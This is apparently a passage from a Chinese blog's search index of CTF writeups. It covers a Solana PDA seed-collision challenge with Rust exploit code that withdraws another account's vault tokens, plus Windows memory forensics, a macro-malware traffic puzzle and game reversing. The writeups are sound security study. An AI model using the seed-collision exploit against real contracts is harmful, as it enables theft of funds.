<li>\u521b\u5efa payer_token_account\uff0c\u521d\u59cb\u7ed9\u5176 1000 token</li> <li>\u83b7\u53d6 seed (\"product\", \"employ_A\") \u7684 PDA \u4f5c\u4e3a vault\uff0c\u8c03\u7528 Deposit\uff0camount \u4e3a 500 token</li> <li>\u521b\u5efa user_record \u548c user_token_account\uff0c\u5411\u5176\u4e2d\u521d\u59cb\u8f6c 100 token</li> <li>\u8f93\u51fa\u4e00\u7cfb\u5217 pubkey</li> <li>\u8bfb\u53d6\u6307\u4ee4\uff0c\u8c03\u7528\u7528\u6237\u5408\u7ea6</li> <li>\u83b7\u53d6 user_token_account \u7684 token \u4e2a\u6570\uff0c\u5982\u679c\u591a\u4e8e 100 \u4e2a\u5219\u8f93\u51fa flag</li> </ul>"},{"location":"writeups/n1ctf2022/#_3","title":"\u505a\u6cd5","text":"<p>\u8fd9\u9898\u7684\u7b54\u9898\u4ea4\u4e92\u4e5f\u7ed9\u4e86\uff0c\u662f rust \u4ee3\u7801\uff0c\u5199\u597d\u4e86\u76f4\u63a5\u6539\u4e0b tcp \u5730\u5740\u7136\u540e cargo run \u5c31\u53ef\u4ee5\u6253\u4e86\u3002</p> <p>\u4e3b\u8981\u7684\u89e3\u6cd5\u8fd8\u662f\u5728 solve/programs/solve/src/lib.rs \u4e2d\u7f16\u5199\u3002</p> <p>\u9898\u7ed9\u4e86\u4e00\u4e2a\u521d\u59cb\u5316\u6307\u4ee4\u548c\u5176\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\uff0c\u5728\u91cc\u9762\u8865\u5145\u5c31\u53ef\u4ee5\u3002\u539f\u6709\u7684\u662f\u4e00\u4e2a\u8c03\u7528 Register \u7684\u4ee3\u7801\uff0cregister \u4e86 (\"product\", \"employ_B\") \u8fd9\u4e2a record\u3002</p> <p>\u627e\u4e86\u5f88\u957f\u65f6\u95f4\u6ca1\u770b\u51fa\u6f0f\u6d1e\u5728\u54ea\u3002\u4f46 solana \u7684\u5b98\u65b9\u6587\u6863\u4e2d\u5173\u4e8e PDA seed \u7684\u63cf\u8ff0\u91cc\u9762\u6709\u4e00\u4e2a warning\uff1a</p> <p>Warning: Because of the way the seeds are hashed there is a potential for program address collisions for the same program id. The seeds are hashed sequentially which means that seeds {\"abcdef\"}, {\"abc\", \"def\"}, and {\"ab\", \"cd\", \"ef\"} will all result in the same program address given the same program id. Since the chance of collision is local to a given program id, the developer of that program must take care to choose seeds that do not collide with each other. For seed schemes that are susceptible to this type of hash collision, a common remedy is to insert separators between seeds, e.g. transforming {\"abc\", \"def\"} into {\"abc\", \"-\", \"def\"}.</p> <p>\u5927\u4f53\u610f\u601d\u5c31\u662f\uff0c\u5982\u679c seed \u6709\u591a\u4e2a\u7684\u8bdd\uff0c\u8ba1\u7b97\u7684\u65f6\u5019\u662f\u76f4\u63a5\u62fc\u63a5\u8d77\u6765\u7684\uff0c[\"abcdef\"] \u548c [\"abc\", \"def\"]\u3001[\"ab\", \"cdef\"] \u7b97\u51fa\u6765\u7684 PDA \u662f\u4e00\u6837\u7684\u3002</p> <p>\u800c\u9898\u76ee\u4e2d\u83b7\u53d6 vault \u7528\u7684 seed \u662f [org_name, employee_id]\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u4e86\u62fc\u63a5\u3002\u65e2\u7136\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528\u540c\u6837\u7684 (org_name, employee_id) \u6765\u6ce8\u518c\u3001\u83b7\u53d6\u5230\u5176\u8bb0\u5f55\u6709 500 token \u7684 vault\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u7528\u53e6\u4e00\u5bf9 (org_name, employee_id) \u6765\u5b8c\u6210\u6ce8\u518c\u3001\u5e76\u5728 withdraw \u83b7\u53d6 vault \u7684\u65f6\u5019\u4f7f\u5176\u62fc\u63a5\u8d77\u6765\u548c\u9898\u76ee\u4e2d\u7684\u4e00\u6837\u6765\u83b7\u53d6\u5230\u90a3\u4e2a 500 token \u7684 vault\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a (\"produc\", \"temploy_A\") \u7136\u540e\u76f4\u63a5 withdraw \u5c31\u53ef\u4ee5\u4e86\uff1a</p> exp \u5408\u7ea6 initialize \u6307\u4ee4 <pre><code>pub fn initialize(ctx: Context&lt;Initialize&gt;) -&gt; Result&lt;()&gt; {\n\n    let o1 = String::from(\"produc\");\n    let e1 = String::from(\"temploy_A\");\n\n    let cpi_accounts = chall::cpi::accounts::Register {\n        catalog: ctx.accounts.catalog.to_account_info(),\n        employee_record: ctx.accounts.user_record.to_account_info(),\n        user: ctx.accounts.user.to_account_info(),\n        system_program: ctx.accounts.system_program.to_account_info(),\n        rent: ctx.accounts.rent.to_account_info(),\n    };\n    let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);\n    chall::cpi::register(cpi_ctx, o1, e1)?;\n\n    let o1 = String::from(\"produc\");\n    let e1 = String::from(\"temploy_A\");\n\n    let cpi_accounts = chall::cpi::accounts::Withdraw {\n        vault: ctx.accounts.vault.to_account_info(),\n        employee_record: ctx.accounts.user_record.to_account_info(),\n        reserve: ctx.accounts.reserve.to_account_info(),\n        user_account: ctx.accounts.user_token_account.to_account_info(),\n        mint: ctx.accounts.mint.to_account_info(),\n        payer: ctx.accounts.user.to_account_info(),\n        token_program: ctx.accounts.token_program.to_account_info(),\n        system_program: ctx.accounts.system_program.to_account_info(),\n        rent: ctx.accounts.rent.to_account_info(),\n    };\n    let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);\n    chall::cpi::withdraw(cpi_ctx, o1, e1, 1)?;\n\n    Ok(())\n}\n</code></pre> <p>\u7136\u540e\u4ea4\u4e92\u7684 main.rs \u4e2d\u8fd8\u6709\u4e00\u5904\u83b7\u53d6\u53c2\u6570 vault \u7684\u5730\u65b9\u4e5f\u9700\u8981\u6539\u4e00\u4e0b\uff1a <pre><code>let vault = Pubkey::find_program_address(\n        &amp;[b\"produc\", b\"temploy_A\"],\n        &amp;chall_id,\n    ).0;\n</code></pre></p> <p>\u5176\u5b83\u6cbf\u7528\u7ed9\u7684\u4ea4\u4e92\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u6837 main.rs \u4e2d\u8f93\u5165\u6307\u4ee4\uff0c\u8c03\u7528 exp \u5408\u7ea6\u7684 Initialize \u6307\u4ee4\uff0c\u5176\u4e2d withdraw \u4e86\uff0c\u7ed3\u675f\u540e\u68c0\u67e5 token amount \u5c31\u4f1a\u6bd4\u539f\u5148\u66f4\u591a\u4e86\u3002</p> <p>flag: n1ctf{I_sh0uld_h4ve_ch0s3n_4_b3tt3r_se3d_de5ign}</p>"},{"location":"writeups/n1ctf2022/#just-find-flag","title":"just find flag","text":"<p>\u4e00\u9053 Windows \u5185\u5b58\u53d6\u8bc1\u9898\uff0c\u5dee\u4e86\u4e00\u6b65\u6ca1\u505a\u51fa\u6765\u3002\u7ed3\u675f\u540e\u8865\u5b8c\u4e86\u3002</p> <p>\u5185\u5b58\u53d6\u8bc1\u76f4\u63a5\u4e0a\u624b\u5148 strings \u4e00\u628a\u68ad\uff0c\u53d1\u73b0\u4e86 flag.zip\u3001flag.txt\u3002\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u76f4\u63a5\u4ece\u5341\u516d\u8fdb\u5236\u91cc\u628a\u5b83\u5b8c\u6574\u5185\u5bb9\u6252\u51fa\u6765\uff0c\u53d1\u73b0\u6709\u5bc6\u7801\uff0c\u800c\u4e14\u662f\u771f\u5bc6\u7801\uff0c\u516d\u4f4d\u6570\u5bc6\u7801\u7206\u4e0d\u51fa\u6765\u3002</p> <p>\u7ee7\u7eed volatility \u4e00\u628a\u68ad\uff0cimageinfo \u51fa\u6765\u662f Win7 \u7cfb\u7edf\uff0c\u4e00\u4e9b\u6ca1\u7528\u7684\u6307\u4ee4\u8f93\u51fa\u5c31\u4e0d\u5728\u8fd9\u91cc\u5199\u4e86</p> <p>\u5728\u6267\u884c consoles \u6307\u4ee4\u7684\u65f6\u5019\u53d1\u73b0\u4e86\uff1a <pre><code>**************************************************\nConsoleProcess: conhost.exe Pid: 2480\nConsole: 0xff656200 CommandHistorySize: 50\nHistoryBufferCount: 2 HistoryBufferMax: 4\nOriginalTitle: %SystemRoot%\\system32\\cmd.exe\nTitle: C:\\Windows\\system32\\cmd.exe - C:\\Python27\\python.exe  -m SimpleHTTPServer\nAttachedProcess: python.exe Pid: 2052 Handle: 0x8c\nAttachedProcess: cmd.exe Pid: 2336 Handle: 0x60\n----\nCommandHistory: 0x37ed10 Application: python.exe Flags: Allocated\nCommandCount: 0 LastAdded: -1 LastDisplayed: -1\nFirstCommand: 0 CommandCountMax: 50\nProcessHandle: 0x8c\n----\nCommandHistory: 0x37e9c0 Application: cmd.exe Flags: Allocated, Reset\nCommandCount: 3 LastAdded: 2 LastDisplayed: 2\nFirstCommand: 0 CommandCountMax: 50\nProcessHandle: 0x60\nCmd #0 at 0x382d60: echo \"Stucked? You can ask WallPaper god for help.\"\nCmd #1 at 0x35e3a0: cd Desktop\nCmd #2 at 0x382dd0: C:\\Python27\\python.exe -m SimpleHTTPServer\n----\nScreen 0x360f70 X:80 Y:300\nDump:\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Users\\dora&gt;echo \"Stucked? You can ask WallPaper god for help.\"\n\"Stucked? You can ask WallPaper god for help.\"\n\nC:\\Users\\dora&gt;cd Desktop\n\nC:\\Users\\dora\\Desktop&gt;C:\\Python27\\python.exe -m SimpleHTTPServer\nServing HTTP on 0.0.0.0 port 8000 ...\n192.168.17.129 - - [05/Nov/2022 03:08:43] \"GET /mem.zip HTTP/1.1\" 200 -\n</code></pre> \u6709\u4e00\u53e5 \"Stucked? You can ask WallPaper god for help.\"\u3002\u6240\u4ee5\u5728 strings \u91cc\u9762\u518d\u641c Wallpaper\uff0c\u53d1\u73b0\u6709\u76f8\u5173\u6587\u4ef6\uff0c\u7ee7\u7eed volatility \u68ad\uff1a <pre><code>volatility -f mem.raw --profile=Win7SP1x64 filescan &gt; files.txt\n</code></pre> \u6709\u5f88\u591a\u5f88\u591a\u6587\u4ef6\uff0c\u5728\u91cc\u9762\u641c\u4e00\u4e0b\u53d1\u73b0\u4e86\u4e24\u4e2a Wallpaper \u8def\u5f84\u4e0b\u7684\u6587\u4ef6\uff1a <pre><code>Offset(P)            #Ptr   #Hnd Access Name\n------------------ ------ ------ ------ ----\n...\n0x000000007eee11c0     10      0 R--r-- \\Device\\HarddiskVolume1\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg\n...\n0x000000007fc48f20     16      0 R--r-d \\Device\\HarddiskVolume1\\Windows\\Web\\Wallpaper\\Windows\\img0.jpeg\n...\n</code></pre> \u7136\u540e\u5206\u522b\u7528 <code>volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q &lt;Offset&gt; --dump-dir=./</code> \u63d0\u53d6\uff0c\u53d1\u73b0\u4e0a\u9762\u4e00\u5f20\u662f Win7 \u7ecf\u5178\u58c1\u7eb8\uff0c\u4e0b\u9762\u4e00\u5f20\u662f\uff1a </p> <p>\u7136\u540e\u8fd9\u91cc\u5361\u4f4f\u4e86\uff0c\u627e\u4e86\u5f88\u957f\u65f6\u95f4\u4e5f\u627e\u4e0d\u51fa\u4ed6\u8bf4\u7684\u6ca1\u6709 Desktop \u7684 full path \u662f\u4ec0\u4e48\u3002</p> <p>\u8d5b\u540e\u542c\u8bf4\u662f\u8981\u7528 volatility \u7684 mtfparser \u6307\u4ee4\uff0c\u8bd5\u4e86\u4e00\u4e0b\uff0c\u786e\u5b9e\u662f\u6709\u7684\uff1a <pre><code>volatility -f mem.raw --profile=Win7SP1x64 mftparser &gt; mftparser.txt\n</code></pre>  \u6709\u4e2a\u8def\u5f84 <code>PROGRA~2\\WINDOW~2\\ACCESS~1\\flag.zip</code>\uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8fd9\u4e2a\u7f29\u5199\u5b9e\u9645\u4e0a\u662f <code>C:\\Program Files (x86)\\Windows NT\\Accessories\\flag.zip</code>\u3002\u6240\u4ee5\u538b\u7f29\u5305\u7684\u5bc6\u7801\u5c31\u662f\uff08<code>\\f</code> \u5c31\u662f\u8981\u8fd9\u6837\u653e\u7740\u4e0d\u7ba1\uff0c\u9898\u76ee\u7ed9\u4e86 note \u4e86\uff09\uff1a <pre><code>hashlib.md5(b\"C:\\Program Files (x86)\\Windows NT\\Accessories\\flag.zip\").hexdigest()\n# 0d3ba7db468bdbd4f93a88c97ba7bef1\n</code></pre> \u89e3\u538b\u51fa\u6765\u5c31\u662f flag \u4e86\u3002</p> <p>\u53cd\u6b63\u8fd8\u662f volatility \u4e0d\u719f\u7ec3\uff0c\u8bb0\u4e0b\u4e86\u3002Windows \u4e0b\u4e00\u4e9b\u5220\u6389\u4e86\u7684\u6587\u4ef6\u53ef\u4ee5\u5c1d\u8bd5\u7528 mtfparser \u6765\u641c\u4e00\u4e0b\u3002</p>"},{"location":"writeups/qwb2022/","title":"\u5f3a\u7f51\u676f 2022 Quals Writeup","text":"<p> \u7ea6 864 \u4e2a\u5b57  12 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>misc \u5f88\u5c11\uff0c\u53ea\u505a\u4e86\u789f\u5f71\u91cd\u91cd\u4e00\u9053\u9898\uff0c\u7eaf\u7eaf\u7684\u50bb\u903c\u9898\u3002\u4e00\u5c42\u4e00\u5c42\u6beb\u65e0\u610f\u4e49\u5730\u786c\u5957\u5a03\uff0c\u505a\u4e86\u597d\u957f\u597d\u957f\u65f6\u95f4\uff0c\u6700\u540e\u5dee\u51e0\u5206\u949f\u6ca1\u505a\u51fa\u6765\uff0c\u771f\u7684\u7834\u9632</p> <p>(\u256f\u00b0\u25a1\u00b0\uff09\u256f\ufe35 \u253b\u2501\u253b</p>"},{"location":"writeups/qwb2022/#_1","title":"\u789f\u5f71\u91cd\u91cd","text":"<p>\u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u52a0\u5bc6\u538b\u7f29\u5305\u548c\u4e00\u4e2a\u6d41\u91cf\u5305</p> <p>\u538b\u7f29\u5305\u7ed3\u5c3e\u9644\u52a0\u4fe1\u606f Password is md5(api address)</p> <p>\u6d41\u91cf\u5305\u770b\u4e0d\u51fa\u4ec0\u4e48\u540d\u5802\uff0c\u76f4\u5230\u7ed9\u4e86\u7b2c\u4e00\u4e2a hint\uff1avmess \u6d41\u91cf\u3002\u4e8e\u662f\u5c31\u53bb\u7ffb\u770b vmess \u7684\u6587\u6863\uff0c\u7ed3\u679c\u6587\u6863\u5199\u7684\u4e0d\u4ec5\ud83d\udca9\u4e00\u6837\u8fd8\u5168**\u662f\u9519\u7684\u3002\u88ab\u8feb\u770b v2ray \u7684\u6e90\u7801\uff0c\u4f46 v2ray \u7684\u6e90\u7801\u8fd8\u662f go \u5199\u7684\uff0c\u8fd9\u96be\u770b\u7684\u8bed\u8a00\u771f\u7684\u8981\u7ed9\u6211\u770b\u5410\u4e86\u3002\u7ffb\u627e\u5230\u4e86 rust \u5199\u7684 leaf \u9879\u76ee\uff0c\u91cc\u9762\u6709 vmess \u76f8\u5173\u7684\u4e1c\u897f\uff0c\u770b\u7684\u5f88\u8212\u9002\u3002\u6700\u540e\u770b\u6e90\u7801\u770b\u51fa\u6765\u7684 vmess \u534f\u8bae\u5185\u5bb9\u5728 vmess \u534f\u8bae \u9875\u9762</p> <p>\u6839\u636e\u534f\u8bae\u8be6\u7ec6\u4fe1\u606f\u89e3\u7801\u8bf7\u6c42\u6d41\u91cf\uff0c\u5f97\u5230\uff1a <pre><code>GET /out HTTP/1.1\nHost: 127.0.0.1:5000\nUser-Agent: curl/7.75.0\nAccept: */*\nConnection: close\n</code></pre></p> <p>\u89e3\u7801\u54cd\u5e94\u6d41\u91cf\u5f97\u5230\u4e00\u4e2a\u5f88\u957f\u7684 html\uff0c\u91cc\u9762\u5b9e\u9645\u4f5c\u7528\u662f\u7528 base64 \u89e3\u7801\u5f97\u5230\u4e00\u4e2a doc \u6587\u6863\u5e76\u4e0b\u8f7d\u3002\u901a\u8fc7\u89e3\u7801\u6216\u8005\u6253\u5f00 html \u90fd\u53ef\u4ee5\u5f97\u5230\u8fd9\u4e2a doc \u6587\u6863\u3002\u4e0d\u8fc7\u5176\u4e2d\u5305\u542b\u4e86\u75c5\u6bd2\u5b8f\uff0c\u53ef\u80fd\u4f1a\u88ab\u9632\u706b\u5899\u6e05\u7406\uff08mac \u4e0d\u4f1a\uff09</p> <p>\u5c06\u6269\u5c55\u540d\u6539\u4e3a .zip \u5e76\u89e3\u538b\u53ef\u4ee5\u5f97\u5230\u5b8f\uff08\u6216\u8005\u8fdb\u5165 Word \u6253\u5f00\u5b8f\u7f16\u8f91\u5668\uff09\u5206\u6790\u4e86\u597d\u4e45\u90a3\u4e00\u5806\u6df7\u6dc6\u7684\u5b8f\uff0c\u6ca1\u4ec0\u4e48\u8fdb\u5c55\uff0c\u5927\u6982\u5c31\u662f\u6267\u884c\u4e86\u4e00\u4e2a dll\uff0c\u627e\u5230\u540e\u9006\u4e5f\u6ca1\u9006\u5230\u4ec0\u4e48</p> <p>\u8003\u8651\u5230\u9632\u706b\u5899\u4f1a\u81ea\u52a8\u6e05\u7406\uff0c\u4ee5\u53ca\u5b8f\u7684\u5199\u6cd5\u548c doc\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u8001\u75c5\u6bd2\uff0c\u4e8e\u662f\u7ed3\u5408 dll \u7684 sha256 \u503c\u641c\u7d22\u4e86\u4e00\u4e0b\uff0c\u679c\u7136\u5f97\u5230\u4e86\u5206\u6790\uff1ahttps://any.run/report/0d7aa23a72d22dcf47f8723c58d101b3b113cbc79dd407a6fac0e65d67076ea1/2211f4a0-81e4-432d-87a8-c7c285a5a919</p> <p>\u91cc\u9762\u5c31\u6709\u8fd9\u4e2a api address\uff1aapi.ipify.org\uff0cmd5 \u540e\u5f97\u5230\u5bc6\u7801 08229f4052dde89671134f1784bed2d6</p> <p>\u89e3\u538b\u540e\u5f97\u5230\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u91cc\u9762\u53ef\u4ee5\u770b\u5230 \"GobThis is a Gob File!Time2022-07-19 14:49:56PNG File\"\uff0c\u662f go \u7684\u5e8f\u5217\u5316\u6587\u4ef6\uff0c\u4f7f\u7528  drosseau/degob \u53cd\u5e8f\u5217\u5316\uff0c\u5f97\u5230 png \u7684\u9010\u5b57\u8282\u503c</p> <p>\u4e0d\u8fc7\u8fd9\u4e9b\u503c\u5199\u5165\u4e8c\u8fdb\u5236\u6587\u4ef6\u540e\u5e76\u4e0d\u80fd\u6253\u5f00\u56fe\u7247\uff0c\u53c8\u5361\u4f4f\u4e86\uff0c\u6709\u4e86\u7b2c\u4e09\u4e2a hint\uff1a\u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u673a\u5bc6\u6027\uff0c\u4ed6\u628a\u6570\u636e\u968f\u673a\u6253\u4e71\u4e86\u3002\u5f88\u65e0\u8bed\uff0c\u5c31\u7eaf\u7eaf\u7684\u50bb\u903c\u9898\uff0c\u867d\u7136\u8bf4\u6709\u65f6\u95f4\u79cd\u5b50\u7684\u6697\u793a\uff0c\u4f46\u5e76\u4e0d\u5f3a\u70c8\uff0c\u7eaf\u7eaf\u50bb\u903c</p> <p>\u7528 go \u5199\u4e00\u4e2a\u968f\u673a\u6253\u4e71\u7684\u7a0b\u5e8f\uff0c\u6309\u7167\u6253\u4e71\u7684\u903b\u8f91\u53cd\u8fc7\u6765\uff0c\u5c31\u53ef\u4ee5\u6062\u590d png \u56fe\u7247\u3002\u4e0d\u8fc7\u5199\u4ee4\u6211\u53cd\u611f\u7684 go \u4ee3\u7801\u6709\u591f\u70e6\u7684</p> <p>\u56fe\u7247\u6253\u5f00\u4e4b\u540e\u662f flag not here \u6587\u5b57\u3002\u53c8\u662f\u5f88\u65e0\u8bed\uff0c\u5230\u8fd9\u4e86\u8fd8**\u5957\u5a03</p> <p>\u4e22\u5230 stegsolve \u91cc\uff0c\u770b\u4e0d\u51fa\u4ec0\u4e48\u4e1c\u897f\uff0cred green plane \u6709\u5947\u602a\u7684\u952f\u9f7f\u72b6\u3002\u540e\u6765\u53d1\u73b0 alpha \u901a\u9053\u90fd\u662f\u6709\u503c\u7684\uff0c\u53ef\u80fd\u4f1a\u901a\u8fc7 alpha \u901a\u9053\u4f20\u4fe1\u606f\uff08\u4e0d\u8fc7\u8fd9\u65f6\u6bd4\u8d5b\u5df2\u7ecf\u5feb\u7ed3\u675f\u4e86\uff09</p> <p>\u7528 PIL \u63d0\u53d6 alpha \u901a\u9053\u7684\u503c\uff0c\u679c\u7136\u6709\u5f88\u591a\u4e0d\u540c\u503c\uff0c\u4e0d\u8fc7\u5927\u90e8\u5206\u8fd8\u662f 0xff \u548c 0x00\uff0c\u6240\u4ee5\u8003\u8651\u53bb\u6389 0xff \u548c 0x00 \u770b\u4e00\u770b\uff0c\u5c06\u56fe\u7247\u5c55\u5f00\u6210\u4e00\u7ef4\uff0c\u7136\u540e\u5254\u9664 ff \u548c 00 \u5f97\u5230\u5b57\u8282\u5f62\u5f0f\u7684\u4e00\u5806 flag\uff1a <pre><code>img = Image.open(\"flag.png\")\narr = np.array(img)\nwidth, height = img.size\nbytes(arr[:,:,3].reshape(width*height)).replace(b\"\\xff\", b\"\").replace(b\"\\x00\", b\"\")\n# b'flag{898161df-fabf-4757-82b6-ffe407c69475}flag{898161df-f...\n</code></pre> \u6700\u7ec8 flag: flag{898161df-fabf-4757-82b6-ffe407c69475}</p> <p>\u7ec6\u6570\u4e00\u4e0b\u8fd9\u9898\u6709\u51e0\u5c42\uff1a</p> <ol> <li>\u89e3\u7801 vmess \u6d41\u91cf</li> <li>\u627e\u5230 doc \u4e2d\u7684\u5b8f</li> <li>\u901a\u8fc7\u5206\u6790\u5b8f\u627e\u5230\u75c5\u6bd2\u8c03\u7528\u7684 api \u5730\u5740</li> <li>\u89e3\u7801 gob \u6587\u4ef6</li> <li>\u901a\u8fc7\u65f6\u95f4\u968f\u673a\u79cd\u5b50\u6062\u590d\u4e71\u5e8f\u7684 png \u6587\u4ef6</li> <li>png alpha \u901a\u9053\u9690\u5199</li> </ol> <p>\u5f88\u591a\u6b65\u9aa4\u6ca1\u6709\u5145\u8db3\u7684\u63d0\u793a\uff0c\u800c\u4e14\u5f88\u591a\u662f\u7eaf\u7eaf\u6ca1\u5fc5\u8981\u7684\u786c\u5957\u3002\u6ca1\u6709\u96be\u9898\u53ef\u4ee5\u4e0d\u51fa\uff0c\u4e0d\u8981\u7528\u8fd9\u79cd\u9898\u6076\u5fc3\u9009\u624b\u2026\u2026</p>"},{"location":"writeups/rctf2022/","title":"RCTF 2022 Writeup","text":"<p> \u7ea6 421 \u4e2a\u5b57  29 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u540e\u8865\u7684 writeup\u3002\u9898\u8fd8\u633a\u6709\u610f\u601d\uff0c\u505a\u4e86\u4e24\u9053 misc\uff0c\u8fd8\u6709\u4e00\u9053\u504f web\u3001\u4e00\u9053 AI \u7684\u88ab\u961f\u53cb\u76f4\u63a5\u6740\u4e86\uff0c\u5c31\u6ca1\u518d\u770b\u3002</p>"},{"location":"writeups/rctf2022/#k999","title":"K999","text":"<p>\u4e00\u4e2a\u6e38\u620f\uff0c\u624b\u6253\u57fa\u672c\u6253\u4e0d\u52a8\uff0c\u9006\u5411/\u770b exe \u53ef\u4ee5\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a\u7528 lua love \u5f15\u64ce\u5199\u7684\u6e38\u620f\u3002\u5176 lua \u6e90\u7801\u4f1a\u76f4\u63a5\u4ee5 zip \u7684\u5f62\u5f0f\u9644\u52a0\u5728 exe \u672b\u5c3e\uff0c\u6240\u4ee5\u63d0\u53d6\u51fa\u6765\u89e3\u538b\u5373\u53ef\u5f97\u5230\u6e38\u620f\u6e90\u7801\u3002</p> <p>\u53ef\u4ee5\u5f88\u660e\u663e\u7684\u53d1\u73b0\u6709\u4e00\u4e2a flag.lua \u7684\u6587\u4ef6\uff0c\u91cc\u9762\u6709\u4e00\u4e9b\u89e3\u5bc6\u76f8\u5173\u4ee3\u7801\uff0c\u5728 main.lua \u91cc\u9762\u53ef\u4ee5\u770b\u5230\u80dc\u5229\u4e4b\u540e\u6709\u8f93\u51fa\u7684\u4ee3\u7801\uff1a</p> <pre><code>if world.KillenemyCount &gt;= 999 then\n    love.graphics.push('all')\n    love.graphics.setColor(255, 255, 0, 255)\n    local flag1 = \"MOON\\r\\n\"\n    local flag2 = \"157 89 215 46 13 189 237 23 241\\r\\n\"\n    local flag3 = \"49 84 146 248 150 138 183 119 52\\r\\n\"\n    local flag4 = \"34 174 146 132 225 192 5 220 221\\r\\n\"\n    local flag5 = \"176 184 218 19 87 249 122\\r\\n\"\n    local flag6 = \"Find a Decrypt!\\r\\n\"\n    love.graphics.print(flag1, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2, 0, 2, 2, 37, 7)\n    love.graphics.print(flag2, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 20, 0, 2, 2, 37, 7)\n    love.graphics.print(flag3, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 40, 0, 2, 2, 37, 7)\n    love.graphics.print(flag4, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 60, 0, 2, 2, 37, 7)\n    love.graphics.print(flag5, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 80, 0, 2, 2, 37, 7)\n    love.graphics.print(flag6, love.graphics.getWidth() / 2, love.graphics.getHeight() / 2 + 100, 0, 2, 2, 37, 7)\n    love.graphics.pop()\n    getflag = true\n</code></pre> <p>\u6240\u4ee5\u628a\u6570\u636e\u62ff\u51fa\u6765\uff0cMOON \u662f key\uff0c\u5269\u4e0b\u7684\u662f s\uff0c\u987a\u7740 flag.lua \u91cc\u7684\u610f\u601d\u76f4\u63a5\u63a5\u4e00\u4e2a\u89e3\u5bc6\u51fd\u6570\u7136\u540e\u76f4\u63a5\u8fd0\u884c\u5373\u53ef\uff1a</p> <pre><code>function Decrypt()\n    local key = \"MOON\"\n    local s = {157, 89, 215, 46, 13, 189, 237, 23, 241, 49, 84, 146, 248, 150, 138, 183, 119, 52, 34, 174, 146, 132, 225, 192, 5, 220, 221, 176, 184, 218, 19, 87, 249, 122}\n    flag = \"\"\n    for i = 1, #s, 1 do\n        flag = flag .. string.char(s[i])\n    end\n    flag = strDecrypt(flag, key)\n    print(flag)\nend\n\nDecrypt()\n</code></pre> <p>\u5f97\u5230 flag: RCTF{1_Rea11y_Want_t0_Y0ur_H0use}</p>"},{"location":"writeups/rctf2022/#ez_alient","title":"ez_alient","text":"<p>\u770b\u8d77\u6765\u662f\u7ecf\u5178\u7684 python \u5916\u661f\u4eba\u6253\u98de\u673a\u6e38\u620f\uff0c\u6709\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u53d1\u73b0 alien.bmp \u672b\u5c3e\u6709 pwd=\"N0bOdy_l0ves_Me\"\uff0c\u662f\u538b\u7f29\u5305\u5bc6\u7801\u3002</p> <p>\u89e3\u538b\u540e\u662f python \u6253\u5305\u597d\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7528 pyinstxtractor+uncompyle6 \u53ef\u4ee5\u89e3\u51fa\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0 alien_invasion.py \u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u6ca1\u7528\u7684\u53d8\u91cf s=\"VTJreE0yNWpNdz09\"\uff0c\u4e8c\u6b21 base64 \u89e3\u7801\u53ef\u4ee5\u5f97\u5230 \"Si13nc3\"\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u6709 PYZ-00.pyz \u6587\u4ef6\uff0c\u540c\u6837\u89e3\u5305\u5e76\u53cd\u7f16\u8bd1\u53ef\u4ee5\u5f97\u5230\u5176\u4ed6\u90e8\u5206\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u66f4\u591a\u6ca1\u7528\u7684\u53d8\u91cf\uff1a</p> <ul> <li>alien.py: a = <code>TVRVPQ==</code> -&gt; <code>MTU=</code> -&gt; 15</li> <li>bullet.py: a = <code>YmtWMlJYST0=</code> -&gt; <code>bkV2RXI=</code> -&gt; nEvEr</li> <li>button.py: k = <code>T1dsMmFXNDU=</code> -&gt; <code>OWl2aW45</code> -&gt; 9ivin9</li> <li>game_stats.py: t = <code>ZFhBPQ==</code> -&gt; <code>dXA=</code> -&gt; up</li> <li>scoreboard.py: m = <code>SmlZPQ==</code> -&gt; <code>JiY=</code> -&gt; &amp;&amp;</li> <li>settings.py: l = <code>Tm5WMA==</code> -&gt; <code>NnV0</code> -&gt; 6ut</li> <li>ship.py: m = <code>YURBeFpHbHVPUT09 VDI0PQ== VTJreE0yNVVNWGs9</code><ul> <li><code>YURBeFpHbHVPUT09</code> -&gt; <code>aDAxZGluOQ==</code> -&gt; h01din9</li> <li><code>VDI0PQ==</code> -&gt; <code>T24=</code> -&gt; On</li> <li><code>VTJreE0yNVVNWGs9</code> -&gt; <code>U2kxM25UMXk=</code> -&gt; Si13nT1y</li> </ul> </li> </ul> 